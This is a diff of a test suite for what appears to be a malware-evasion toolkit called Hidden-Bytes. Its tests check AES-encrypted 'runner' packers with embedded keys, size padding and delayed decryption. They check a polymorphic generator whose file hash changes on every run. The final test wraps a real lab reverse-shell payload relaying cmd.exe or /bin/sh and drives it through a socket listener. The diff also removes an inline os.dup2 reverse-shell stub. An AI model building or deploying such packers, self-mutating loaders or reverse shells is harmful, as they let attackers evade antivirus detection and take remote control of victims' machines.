@@ -6,7 +6,6 @@ from pathlib import Path
 import socket
 import subprocess
 import sys
-import threading
 import time
 
 import pytest
@@ -15,51 +14,68 @@ from src.evasion import (
     MIB,
     build_runner_file,
     decrypt_file,
-    encrypt_file,
     inspect_file,
     is_runner,
+    parse_container,
     read_runner_container,
 )
-from src.evasion.crypto import build_payload
+from src.evasion.crypto import build_payload, decrypt_payload
 from src.polymorphic import generate
 
 
 def test_encryption_padding_metadata_and_round_trip(tmp_path: Path) -> None:
     source = tmp_path / "sample.bin"
     source.write_bytes(b"hello\x00binary" * 100)
-    container = tmp_path / "sample.hbx"
+    runner = tmp_path / "sample.pyz"
     recovered = tmp_path / "recovered.bin"
 
-    key = encrypt_file(source, container, add_size_mb=1, delay=0)
+    build_runner_file(source, runner, add_size_mb=1, delay=0)
 
-    assert container.stat().st_size == source.stat().st_size + MIB
-    assert container.read_bytes()[:4] == b"HBX1"
-    assert inspect_file(container)["algorithm"] == "AES-256-GCM"
-    assert source.read_bytes() not in container.read_bytes()
-    decrypt_file(container, recovered, key)
+    assert runner.stat().st_size == source.stat().st_size + MIB
+    assert is_runner(runner)
+    assert inspect_file(runner)["algorithm"] == "AES-256-GCM"
+    # The embedded key means recovery needs no separate key file.
+    assert source.read_bytes() not in runner.read_bytes()
+    decrypt_file(runner, recovered)
     assert recovered.read_bytes() == source.read_bytes()
+
+
+def test_build_payload_produces_an_hbx1_container(tmp_path: Path) -> None:
+    """The container format itself: HBX1 magic, metadata, and a clean round-trip."""
+
+    source = tmp_path / "sample.bin"
+    source.write_bytes(b"container bytes")
+
+    body, header, key = build_payload(source, delay=0)
+
+    assert body[:4] == b"HBX1"
+    assert header["algorithm"] == "AES-256-GCM"
+
+    parsed_header, ciphertext = parse_container(body)
+    assert parsed_header == header
+    assert decrypt_payload(parsed_header, ciphertext, key) == source.read_bytes()
 
 
 def test_wrong_key_is_rejected(tmp_path: Path) -> None:
     source = tmp_path / "sample.bin"
     source.write_bytes(b"important")
-    container = tmp_path / "sample.hbx"
-    encrypt_file(source, container, add_size_mb=0.01, delay=0)
-    wrong = tmp_path / "wrong.key"
-    import base64, os
-    wrong.write_text(base64.b64encode(os.urandom(32)).decode("ascii"))
-    with pytest.raises(Exception):
-        decrypt_file(container, tmp_path / "out", wrong)
+
+    body, header, _key = build_payload(source, delay=0)
+    _parsed, ciphertext = parse_container(body)
+
+    wrong_key = os.urandom(32)
+    with pytest.raises(ValueError, match="authentication failed"):
+        decrypt_payload(header, ciphertext, wrong_key)
 
 
 def test_recovery_enforces_recorded_delay(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
     source = tmp_path / "sample.bin"
     source.write_bytes(b"delay me")
-    container = tmp_path / "sample.hbx"
-    key = encrypt_file(source, container, add_size_mb=0.01, delay=101)
+    runner = tmp_path / "sample.pyz"
+    build_runner_file(source, runner, add_size_mb=0.01, delay=101)
     sleeps: list[float] = []
     monkeypatch.setattr("src.evasion.crypto.time.sleep", sleeps.append)
-    decrypt_file(container, tmp_path / "out", key)
+    decrypt_file(runner, tmp_path / "out")
     assert sleeps == [101]
 
 
@@ -72,27 +88,26 @@ def test_polymorphic_program_changes_itself_but_keeps_behavior(tmp_path: Path) -
 
     environment = dict(os.environ)
 
-    before = hashlib.sha256(demo.read_bytes()).hexdigest()
-    first = subprocess.run(
-        [sys.executable, str(demo)],
-        env=environment,
-        check=True,
-        capture_output=True,
-        text=True,
-    )
-    after_first = hashlib.sha256(demo.read_bytes()).hexdigest()
-    second = subprocess.run(
-        [sys.executable, str(demo)],
-        env=environment,
-        check=True,
-        capture_output=True,
-        text=True,
-    )
-    after_second = hashlib.sha256(demo.read_bytes()).hexdigest()
+    # Run several times: the hash must change on EVERY run (not stall after a
+    # couple), while the payload output stays identical.
+    hashes = [hashlib.sha256(demo.read_bytes()).hexdigest()]
+    outputs: list[str] = []
+    for _ in range(5):
+        run = subprocess.run(
+            [sys.executable, str(demo)],
+            env=environment,
+            check=True,
+            capture_output=True,
+            text=True,
+        )
+        outputs.append(run.stdout)
+        hashes.append(hashlib.sha256(demo.read_bytes()).hexdigest())
 
-    assert before != after_first != after_second
-    assert first.stdout == second.stdout
-    assert "PAYLOAD-RAN" in first.stdout
+    # Every recorded hash is distinct -> the file mutates on each run.
+    assert len(set(hashes)) == len(hashes), f"hash stopped changing: {hashes}"
+    # Behaviour is stable across all runs.
+    assert len(set(outputs)) == 1
+    assert "PAYLOAD-RAN" in outputs[0]
 
 
 def test_polymorphic_program_recovers_payload_without_passphrase(tmp_path: Path) -> None:
@@ -261,29 +276,28 @@ def test_decrypt_recovers_the_payload_from_a_runner(tmp_path: Path) -> None:
     assert recovered.read_bytes() == source.read_bytes()
 
 
-def test_decrypt_recovers_the_payload_from_a_container(tmp_path: Path) -> None:
-    source = tmp_path / "sample.bin"
-    source.write_bytes(b"container data")
+def test_decrypt_rejects_a_non_runner_input(tmp_path: Path) -> None:
+    """Only runners carry the embedded key, so a bare file cannot be recovered."""
 
-    container = tmp_path / "sample.hbx"
-    key_path = encrypt_file(source, container, add_size_mb=0.01, delay=0)
+    not_a_runner = tmp_path / "plain.bin"
+    not_a_runner.write_bytes(b"just some bytes, not a Hidden-Bytes runner")
 
-    recovered = tmp_path / "recovered.bin"
-    decrypt_file(container, recovered, key_path)
-    assert recovered.read_bytes() == source.read_bytes()
+    with pytest.raises(ValueError, match="not a Hidden-Bytes runner"):
+        decrypt_file(not_a_runner, tmp_path / "out")
 
 
-def test_container_mode_still_writes_a_key_file(tmp_path: Path) -> None:
-    source = tmp_path / "sample.bin"
-    source.write_bytes(b"key file mode")
+def test_inspect_reports_runner_metadata_without_a_kdf(tmp_path: Path) -> None:
+    source = tmp_path / "simple_program.py"
+    _write_payload(source)
 
-    container = tmp_path / "sample.hbx"
-    key_path = encrypt_file(source, container, add_size_mb=0.01, delay=0)
+    runner = tmp_path / "obfuscated.pyz"
+    build_runner_file(source, runner, add_size_mb=0.01, delay=0)
 
-    assert key_path is not None
-    assert key_path.is_file()
-    assert inspect_file(container)["artifact_type"] == "container"
-    assert "kdf" not in inspect_file(container)
+    info = inspect_file(runner)
+    assert info["artifact_type"] == "runner"
+    assert info["algorithm"] == "AES-256-GCM"
+    # No key-derivation block: each encryption uses a fresh random key.
+    assert "kdf" not in info
 
 
 def test_build_payload_rejects_a_negative_delay(tmp_path: Path) -> None:
@@ -342,7 +356,15 @@ def test_cli_encrypt_then_run_round_trip(tmp_path: Path) -> None:
 def test_polymorphic_payload_connects_to_the_designated_ip_and_port(
     tmp_path: Path,
 ) -> None:
-    """The generated program must reach the listener the operator chose."""
+    """The generated program must reach the listener and relay a working shell.
+
+    This drives the *real* ``lab/reverse_shell_payload.py``, which relays the
+    shell over the socket with pipes and threads (cross-platform: ``cmd.exe`` on
+    Windows, ``/bin/sh`` on POSIX) rather than the POSIX-only ``os.dup2`` trick.
+    """
+
+    payload = Path(__file__).resolve().parents[1] / "lab" / "reverse_shell_payload.py"
+    assert payload.is_file(), "the real reverse shell payload is missing"
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -351,56 +373,42 @@ def test_polymorphic_payload_connects_to_the_designated_ip_and_port(
     server.listen(1)
     server.settimeout(60)
 
-    payload = tmp_path / "reverse_shell_payload.py"
-    payload.write_text(
-        "import os, socket, subprocess, sys\n"
-        "host = sys.argv[sys.argv.index('--host') + 1]\n"
-        "port = int(sys.argv[sys.argv.index('--port') + 1])\n"
-        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-        "s.connect((host, port))\n"
-        "os.dup2(s.fileno(), 0)\n"
-        "os.dup2(s.fileno(), 1)\n"
-        "os.dup2(s.fileno(), 2)\n"
-        "subprocess.call([sys.executable, '-c', 'print(\"SHELL-RAN\")'])\n"
-    )
-
     demo = tmp_path / "polymorphic.py"
     generate(demo, str(payload))
 
-    received: list[bytes] = []
+    proc = subprocess.Popen(
+        [sys.executable, str(demo), "--host", "127.0.0.1", "--port", str(port)],
+        env=dict(os.environ),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+    )
 
-    def accept() -> None:
-        try:
-            connection, _address = server.accept()
-        except OSError:
-            return
-        with connection:
-            connection.settimeout(15)
-            try:
-                received.append(connection.recv(4096))
-            except OSError:
-                pass
-
-    listener = threading.Thread(target=accept, daemon=True)
-    listener.start()
-
+    received = b""
     try:
-        completed = subprocess.run(
-            [sys.executable, str(demo), "--host", "127.0.0.1", "--port", str(port)],
-            env=dict(os.environ),
-            capture_output=True,
-            text=True,
-            timeout=120,
-        )
+        connection, _address = server.accept()
+        connection.settimeout(15)
+        # ``echo`` works the same in cmd.exe and /bin/sh. Then close the shell.
+        time.sleep(0.5)
+        connection.sendall(b"echo SHELL-RAN\n")
+        time.sleep(1.0)
+        connection.sendall(b"exit\n")
+        try:
+            while True:
+                chunk = connection.recv(4096)
+                if not chunk:
+                    break
+                received += chunk
+        except OSError:
+            pass
+        connection.close()
     finally:
         server.close()
 
-    listener.join(timeout=20)
+    stdout, _ = proc.communicate(timeout=60)
 
-    assert completed.returncode == 0, completed.stderr
-    assert "Polymorphic signature updated successfully" in completed.stdout
-    assert received, "the payload never connected to the designated address"
-    assert b"SHELL-RAN" in received[0]
+    assert "Polymorphic signature updated successfully" in stdout
+    assert b"SHELL-RAN" in received, "the relayed shell never ran the command"
 
 
 # ---------------------------------------------------------------------------
